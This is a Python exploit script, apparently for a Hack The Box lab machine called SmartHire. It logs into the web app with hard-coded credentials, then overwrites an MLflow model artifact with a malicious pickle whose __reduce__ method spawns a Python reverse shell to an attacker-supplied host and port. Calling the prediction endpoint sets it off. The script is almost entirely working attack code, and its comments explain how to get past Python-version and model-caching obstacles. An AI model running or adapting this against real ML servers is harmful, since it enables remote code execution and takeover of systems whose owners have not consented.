#!/usr/bin/env python3
"""
SmartHire - MLflow Pickle Deserialization RCE
Usage: python3 exploit.py <LHOST> <LPORT>
"""

import pickle
import os
import sys
import time
import requests

if len(sys.argv) != 3:
    print(f"Usage: {sys.argv[0]} <LHOST> <LPORT>")
    sys.exit(1)

LHOST = sys.argv[1]
LPORT = sys.argv[2]

TARGET  = "http://smarthire.htb"
MLFLOW  = "http://models.smarthire.htb"
MLCREDS = ("admin", "password")

TRAIN_CSV = b"name,skills,experience,education,position_applied,previous_company\nAlice,Python,48,Masters,Eng,Corp\nBob,Java,72,Bachelors,Dev,Inc\n"
PRED_CSV  = b"name,skills,experience,education,position_applied,previous_company\nTest,Python,24,Bachelors,Eng,Co\n"

# ── Pickle payload ────────────────────────────────────────────────────────────
# os.system() is used (not exec/cloudpickle) because the server runs Python 3.10
# while this script may run on 3.11+. cloudpickle embeds code objects that are
# version-specific and will raise "code expected at most 16 arguments, got 18".
# os.system is a C built-in — no code objects, works across all Python versions.
#
# The reverse shell is spawned via a fresh python3 call to avoid the same issue:
# os.system() launches /bin/sh -c "python3 -c '...'" on the server, and that
# python3 process (3.10) opens the socket. Bash /dev/tcp is avoided since the
# Flask worker may run under a shell that doesn't support it.

class ReverseShell:
    def __reduce__(self):
        cmd = (
            f"python3 -c '"
            f"import socket,subprocess,os;"
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            f"s.connect((\"{LHOST}\",{LPORT}));"
            f"os.dup2(s.fileno(),0);"
            f"os.dup2(s.fileno(),1);"
            f"os.dup2(s.fileno(),2);"
            f"subprocess.call([\"/bin/bash\",\"-i\"])'"
        )
        return (os.system, (cmd,))

payload = pickle.dumps(ReverseShell())

# ── Login ─────────────────────────────────────────────────────────────────────
print("[*] Logging in...")
sess = requests.Session()
r = sess.post(f"{TARGET}/login", data={"username": "ben", "password": "12345678"})
if "dashboard" not in r.url and r.status_code not in (200, 302):
    print("[!] Login failed"); sys.exit(1)
print("[+] Logged in as Admin")

# ── Train a fresh model (creates a new uncached MLflow run) ───────────────────
# MLflow caches downloaded models locally. Overwriting an artifact that was
# already loaded has no effect — the server uses its cached copy.
# Uploading a new CSV registers a brand-new model version under a new run_id.
# We overwrite THAT run's pickle before /predict ever loads it, so there is
# no cache entry yet and our malicious file is fetched fresh.
print("[*] Uploading training CSV to register a new model version...")
r = sess.post(f"{TARGET}/upload_hiring_data",
              files={"file": ("train.csv", TRAIN_CSV, "text/csv")})
version = r.json().get("model_info", {}).get("version", "?")
print(f"[+] Registered model version {version}")

# ── Grab the run_id MLflow just created ───────────────────────────────────────
print("[*] Fetching new run_id from MLflow API...")
r = requests.post(
    f"{MLFLOW}/api/2.0/mlflow/runs/search",
    json={"experiment_ids": ["0"], "max_results": 1},
    auth=MLCREDS
)
run_id = r.json()["runs"][0]["info"]["run_id"]
print(f"[+] run_id: {run_id}")

# ── Overwrite python_model.pkl with malicious pickle ──────────────────────────
print("[*] Replacing python_model.pkl with malicious pickle...")
url = f"{MLFLOW}/api/2.0/mlflow-artifacts/artifacts/0/{run_id}/artifacts/model/python_model.pkl"
r = requests.put(url, data=payload, auth=MLCREDS,
                 headers={"Content-Type": "application/octet-stream"})
if r.status_code != 200:
    print(f"[!] Upload failed: {r.status_code} {r.text}"); sys.exit(1)
print(f"[+] Malicious pickle uploaded ({len(payload)} bytes)")

# ── Trigger prediction → model is loaded → pickle executes ───────────────────
print(f"[*] Triggering /predict — watch your listener on {LHOST}:{LPORT} ...")
try:
    sess.post(f"{TARGET}/predict",
              files={"file": ("pred.csv", PRED_CSV, "text/csv")},
              timeout=20)
except requests.exceptions.Timeout:
    pass  # expected — the shell holds the connection open

print("[+] Request sent. If the shell didn't arrive, the server may block outbound TCP.")
